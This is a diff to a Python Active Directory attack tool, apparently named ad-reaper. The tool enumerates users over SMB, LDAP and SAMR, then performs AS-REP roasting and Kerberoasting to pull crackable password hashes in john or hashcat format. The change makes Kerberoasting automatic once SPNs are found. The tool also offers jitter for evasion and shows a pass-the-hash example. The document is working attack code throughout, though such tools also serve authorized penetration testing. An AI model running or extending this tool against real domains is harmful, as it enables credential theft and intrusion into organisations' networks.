@@ -151,14 +151,14 @@ class GetUserNoPreAuth:
 
             if self.format == 'john':
                 if etype in (17,18):
-                    return f'$krb5asrep${etype}${username}@{self.domain}:${hexlify(cipher[:-12]).decode()}${hexlify(cipher[-12:]).decode()}'
+                    return f'$krb5asrep${etype}${username}@{self.domain}:{hexlify(cipher[:-12]).decode()}${hexlify(cipher[-12:]).decode()}'
                 else:
-                    return f'$krb5asrep${username}@{self.domain}:${hexlify(cipher[:16]).decode()}${hexlify(cipher[16:]).decode()}'
+                    return f'$krb5asrep${username}@{self.domain}:{hexlify(cipher[:16]).decode()}${hexlify(cipher[16:]).decode()}'
             else:  # hashcat
                 if etype in (17,18):
-                    return f'$krb5asrep${etype}${username}@${self.domain}:${hexlify(cipher[:-12]).decode()}${hexlify(cipher[-12:]).decode()}'
+                    return f'$krb5asrep${etype}${username}@${self.domain}:{hexlify(cipher[:-12]).decode()}${hexlify(cipher[-12:]).decode()}'
                 else:
-                    return f'$krb5asrep${etype}${username}@{self.domain}:${hexlify(cipher[:16]).decode()}${hexlify(cipher[16:]).decode()}'
+                    return f'$krb5asrep${etype}${username}@{self.domain}:{hexlify(cipher[:16]).decode()}${hexlify(cipher[16:]).decode()}'
 
         except KerberosError as e:
             if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
@@ -232,10 +232,12 @@ class GetUserSPNs:
                 print(f"  > {u}")
             return
 
-        hash_file = Path(output_dir or '.') / "kerberoast_hashes.txt"
-        hash_file.parent.mkdir(parents=True, exist_ok=True)
+        f = None
+        if output_dir:
+            hash_file = Path(output_dir) / "kerberoast_hashes.txt"
+            f = open(hash_file, 'w')
 
-        with open(hash_file, 'w') as f:
+        try:
             try:
                 tgt_data = self.getTGT()
             except:
@@ -276,12 +278,15 @@ class GetUserSPNs:
                         continue
 
                     print_vuln(f"Kerberoast hash for {user}: {entry}")
-                    f.write(entry + '\n')
+                    if f: f.write(entry + '\n')
 
                 except Exception as e:
                     print_error(f"Failed to roast {user}: {str(e).splitlines()[0]}")
 
-        print_success(f"Kerberoast hashes saved to {hash_file}")
+            if f:
+                print_success(f"Kerberoast hashes saved to {hash_file}")
+        finally:
+            if f: f.close()
 
 
 # ---- Core enumeration functions ----
@@ -577,7 +582,7 @@ def enumerate_users_samr(target_ip):
     print_fail("FAILED: Anonymous SAMR enumeration is NOT allowed.")
     return []
 
-def check_asrep_roastable_users(target_ip, domain_dn, user_list, format='hashcat', output_dir='.', no_roast=False, jitter=0):
+def check_asrep_roastable_users(target_ip, domain_dn, user_list, format='hashcat', output_dir=None, no_roast=False, jitter=0):
     """Check and optionally roast AS-REP vulnerable users (clean output)"""
     domain = dn_to_dns(domain_dn)
     if not domain:
@@ -586,7 +591,6 @@ def check_asrep_roastable_users(target_ip, domain_dn, user_list, format='hashcat
 
     roaster = GetUserNoPreAuth(domain, target_ip, format)
     asrep_users = []
-    hash_file = Path(output_dir) / 'asrep_hashes.txt'
 
     if no_roast:
         print_info("Skipping actual TGT requests (--no-roast). Potentially roastable users:")
@@ -594,7 +598,12 @@ def check_asrep_roastable_users(target_ip, domain_dn, user_list, format='hashcat
             print(f"  > {u}")
         return user_list
 
-    with open(hash_file, 'w') as f:
+    f = None
+    if output_dir:
+        hash_file = Path(output_dir) / 'asrep_hashes.txt'
+        f = open(hash_file, 'w')
+
+    try:
         for user in user_list:
             if jitter > 0:
                 time.sleep(random.uniform(0.3, jitter))
@@ -602,7 +611,7 @@ def check_asrep_roastable_users(target_ip, domain_dn, user_list, format='hashcat
             try:
                 hash_val = roaster.getTGT(user)
                 print_vuln(f"AS-REP roastable: {user} → {hash_val}")
-                f.write(hash_val + '\n')
+                if f: f.write(hash_val + '\n')
                 asrep_users.append(user)
 
             except Exception as e:
@@ -618,7 +627,10 @@ def check_asrep_roastable_users(target_ip, domain_dn, user_list, format='hashcat
                     first_line = str(e).splitlines()[0] if str(e) else "Unknown error"
                     print_error(f"AS-REP failed for {user}: {first_line}")
 
-    if asrep_users:
+    finally:
+        if f: f.close()
+
+    if asrep_users and output_dir:
         print_success(f"AS-REP hashes saved to {hash_file} ({len(asrep_users)} users)")
     else:
         print_info("No AS-REP roastable accounts found in this list")
@@ -703,7 +715,7 @@ def enumerate_smb_shares_auth(target_ip, domain, username, password, lmhash, nth
     except Exception as e:
         print_fail(f"Connection Error: {e}")
 
-def enumerate_ldap_auth(target_ip, domain, username, password, lmhash, nthash, dump_hashes=False, hash_format='hashcat', output_dir=None):
+def enumerate_ldap_auth(target_ip, domain, username, password, lmhash, nthash):
     """
     Performs a comprehensive, authenticated LDAP enumeration.
     Returns the domain's search_base, a list of the user's groups, and a
@@ -814,11 +826,6 @@ def enumerate_ldap_auth(target_ip, domain, username, password, lmhash, nthash, d
         print_fail(f"Could not connect to LDAP port 389 on {target_ip}")
     except Exception as e:
         print_fail(f"LDAP Error: {e}")
-
-    if dump_hashes and spn_users:
-        print_section("Kerberoasting Hashes")
-        roaster = GetUserSPNs(username, password, domain, '', lmhash, nthash, target_ip, hash_format)
-        roaster.request_multiple_TGSs(spn_users, output_dir)
 
     return search_base, user_groups, findings
 
@@ -972,7 +979,7 @@ def print_suggestions(target_ip, findings, auth_creds=None):
 
 # --- Main Execution Logic ---
 
-def run_anonymous_scan(target_ip, users_file=None, dump_hashes=False, hash_format='hashcat', output_dir='.', no_roast=False, jitter=0, spider_shares=False):
+def run_anonymous_scan(target_ip, users_file=None, hash_format='hashcat', output_dir=None, no_roast=False, jitter=0, spider_shares=False):
     """
     Orchestrates the anonymous scanning modules: SMB null session, LDAP anonymous,
     SAMR enumeration, and AS-REP roasting check.
@@ -992,7 +999,7 @@ def run_anonymous_scan(target_ip, users_file=None, dump_hashes=False, hash_forma
     samr_users = enumerate_users_samr(target_ip)
 
     master_user_set = set(ldap_users) | set(samr_users)
-    if master_user_set:
+    if master_user_set and output_dir:
         with open(Path(output_dir) / "ad_users.txt", "w") as f:
             for user in sorted(master_user_set):
                 f.write(f"{user}\n")
@@ -1010,12 +1017,12 @@ def run_anonymous_scan(target_ip, users_file=None, dump_hashes=False, hash_forma
         except Exception as e:
             print_error(f"Failed to load users_file: {e}")
     findings['asrep_users'] = check_asrep_roastable_users(target_ip, domain_dn, user_list, hash_format, output_dir, no_roast, jitter)
-    if dump_hashes and spns:
+    if spns:
         print_section("Kerberoasting")
         print_error("Kerberoasting requires auth creds - skipping in anonymous mode")
     return findings
 
-def run_authenticated_scan(target_ip, username, password, lmhash, nthash, domain=None, dump_hashes=False, hash_format='hashcat', output_dir='.', rc4_only=False, no_roast=False, jitter=0):
+def run_authenticated_scan(target_ip, username, password, lmhash, nthash, domain=None, hash_format='hashcat', output_dir=None, rc4_only=False, no_roast=False, jitter=0):
     """
     Orchestrates the authenticated scanning modules: LDAP enumeration, SMB shares,
     misconfiguration checks, and Kerberoasting.
@@ -1050,33 +1057,32 @@ def run_authenticated_scan(target_ip, username, password, lmhash, nthash, domain
 
     check_access_paths_auth(target_ip, user_groups, user, password, lmhash, nthash, domain)
 
-    if dump_hashes:
-        spn_list = findings.get('spns', [])
-        spn_users = []
+    spn_list = findings.get('spns', [])
+    spn_users = []
 
-        for item in spn_list:
-            if isinstance(item, dict):
-                # Pull the actual sAMAccountName / user that owns the SPN
-                account = item.get('user') or item.get('sAMAccountName') or item.get('name')
-                if account and isinstance(account, str):
-                    spn_users.append(account)
-            elif isinstance(item, str):
-                # Legacy fallback — try to guess username from SPN string
-                print_info(f"Legacy SPN string: {item} — attempting parse")
-                parts = item.split('/')
-                if len(parts) > 1:
-                    guessed = parts[1].split('@')[0].split('.')[0]
-                    spn_users.append(guessed)
+    for item in spn_list:
+        if isinstance(item, dict):
+            # Pull the actual sAMAccountName / user that owns the SPN
+            account = item.get('user') or item.get('sAMAccountName') or item.get('name')
+            if account and isinstance(account, str):
+                spn_users.append(account)
+        elif isinstance(item, str):
+            # Legacy fallback — try to guess username from SPN string
+            print_info(f"Legacy SPN string: {item} — attempting parse")
+            parts = item.split('/')
+            if len(parts) > 1:
+                guessed = parts[1].split('@')[0].split('.')[0]
+                spn_users.append(guessed)
 
-        if spn_users:
-            spn_users = list(set(spn_users))
-            print_info(f"Preparing to Kerberoast {len(spn_users)} accounts: {', '.join(spn_users)}")
-            
-            print_section("Kerberoasting Hashes")
-            roaster = GetUserSPNs(user, password, domain, lmhash, nthash, target_ip, rc4_only, hash_format)
-            roaster.roast(spn_users, output_dir, jitter, no_roast)
-        else:
-            print_info("No valid usernames extracted from SPNs for roasting")
+    if spn_users:
+        spn_users = list(set(spn_users))
+        print_info(f"Preparing to Kerberoast {len(spn_users)} accounts: {', '.join(spn_users)}")
+        
+        print_section("Kerberoasting Hashes")
+        roaster = GetUserSPNs(user, password, domain, lmhash, nthash, target_ip, rc4_only, hash_format)
+        roaster.roast(spn_users, output_dir, jitter, no_roast)
+    else:
+        print_info("No valid usernames extracted from SPNs for roasting")
     return findings
 
 def get_domain_from_ldap(target_ip, username=None, password=None, lmhash=None, nthash=None):
@@ -1155,7 +1161,7 @@ Examples:
     python ad-reaper.py 10.10.10.10 -u corp.local/jdavis -p Winter2025 --users-file interesting_users.txt --rc4-only
 
   PTH + output dir:
-    python ad-reaper.py 10.10.10.10 -u Administrator -H aad3b...:31d6... --output-dir loot --dump-hashes
+    python ad-reaper.py 10.10.10.10 -u Administrator -H aad3b...:31d6... --output loot
         """
     )
 
@@ -1168,17 +1174,15 @@ Examples:
     g.add_argument("-d", "--domain",     help="Force domain name (useful when discovery fails)")
 
     g = parser.add_argument_group("Roasting & Output")
-    g.add_argument("--dump-hashes",      action="store_true", help="Dump AS-REP / Kerberoast hashes")
     g.add_argument("--hash-format",      choices=['john','hashcat'], default='hashcat')
-    g.add_argument("--output-dir",       default=".", help="Where to save files")
+    g.add_argument("-o", "--output",     default="reaper-logs", help="Output dir for logs and hashes (default: reaper-logs)")
+    g.add_argument("--no-logging",       action="store_true", help="Disable file logging (logs and hashes)")
     g.add_argument("--users-file",       help="Target only these users for AS-REP roasting")
     g.add_argument("--rc4-only",         action="store_true", help="Force RC4 for Kerberoasting")
     g.add_argument("--no-roast",         action="store_true", help="Report roastable users without requesting tickets")
     g.add_argument("--jitter",           type=float, default=0, help="Delay (seconds) jitter for roasting requests (evasion)")
     g.add_argument("--spider-shares",    action="store_true", help="Recursively list files on accessible SMB shares (anonymous)")
 
-    g = parser.add_argument_group("Usability")
-    g.add_argument("--quiet",            action="store_true", help="Suppress console output, log to file")
 
     args = parser.parse_args()
 
@@ -1188,13 +1192,31 @@ Examples:
         print_error(f"Invalid IP: {args.target}")
         sys.exit(1)
 
-    outdir = Path(args.output_dir)
-    outdir.mkdir(parents=True, exist_ok=True)
-
-    if args.quiet:
-        sys.stdout = open(outdir / 'reaper.log', 'w')
-
     is_auth = bool(args.username and (args.password or args.hashes))
+    outdir = None
+
+    if not args.no_logging:
+        outdir = Path(args.output)
+        outdir.mkdir(parents=True, exist_ok=True)
+        
+        log_name = "reaper_auth.log" if is_auth else "reaper_anon.log"
+        log_file = outdir / log_name
+
+        class Tee(object):
+            def __init__(self, name, mode):
+                self.file = open(name, mode)
+                self.stdout = sys.stdout
+            def write(self, data):
+                self.stdout.write(data)
+                self.file.write(data)
+                self.file.flush()
+            def flush(self):
+                self.stdout.flush()
+                self.file.flush()
+            def close(self):
+                self.file.close()
+        sys.stdout = Tee(log_file, 'w')
+
 
     if is_auth:
         domain = args.domain or ''
@@ -1205,18 +1227,17 @@ Examples:
 
         print_section(f"Authenticated Scan → {args.target} @ {domain}\\{args.username.split('/')[-1]}")
 
-        findings = run_authenticated_scan(args.target, args.username, pw, lmh, nth, domain, args.dump_hashes, args.hash_format, args.output_dir, args.rc4_only, args.no_roast, args.jitter)
+        findings = run_authenticated_scan(args.target, args.username, pw, lmh, nth, domain, args.hash_format, outdir, args.rc4_only, args.no_roast, args.jitter)
         auth_creds = {'username': args.username, 'password': pw, 'lmhash': lmh, 'nthash': nth}
         print_suggestions(args.target, findings, auth_creds)
     else:
         print_section(f"Anonymous Scan → {args.target}")
-        findings = run_anonymous_scan(args.target, args.users_file, args.dump_hashes, args.hash_format, args.output_dir, args.no_roast, args.jitter, args.spider_shares)
+        findings = run_anonymous_scan(args.target, args.users_file, args.hash_format, outdir, args.no_roast, args.jitter, args.spider_shares)
         print_suggestions(args.target, findings)
 
     print_section("Scan finished")
-    if args.quiet:
-        sys.stdout.close()
-        print("Output logged to reaper.log")
+    if outdir:
+        print(f"Output logged to {outdir}")
 
 if __name__ == "__main__":
     main()
